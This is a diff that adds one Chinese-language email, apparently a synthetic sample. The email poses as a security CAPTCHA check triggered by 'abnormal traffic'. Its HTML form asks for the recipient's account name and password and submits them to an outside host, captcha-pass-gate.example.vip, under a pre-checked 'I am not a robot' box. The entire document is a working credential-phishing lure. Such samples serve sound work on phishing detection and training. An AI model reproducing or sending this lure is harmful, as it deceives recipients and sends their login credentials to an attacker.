@@ -1,0 +1,10 @@
+From: =?utf-8?B?5a6J5YWo6aqM6K+B?= <robot@captcha-gate.example>
+To: me@personal.example
+Date: Mon, 07 Sep 2026 09:16:00 +0800
+Message-ID: <0006-b15@synth.example>
+Subject: 请完成人机验证以继续收件
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+
+<html><body style='text-align:center'><h3>安全验证</h3><p>检测到异常流量，请完成验证：</p><div style='border:1px solid #ccc;padding:16px;display:inline-block'><form action='https://captcha-pass-gate.example.vip/v'><input name='acct' placeholder='账号'> <input type='password' name='pwd' placeholder='密码'><br><br><label><input type='checkbox' checked> 我不是机器人</label> <button>验证</button></form></div></body></html>
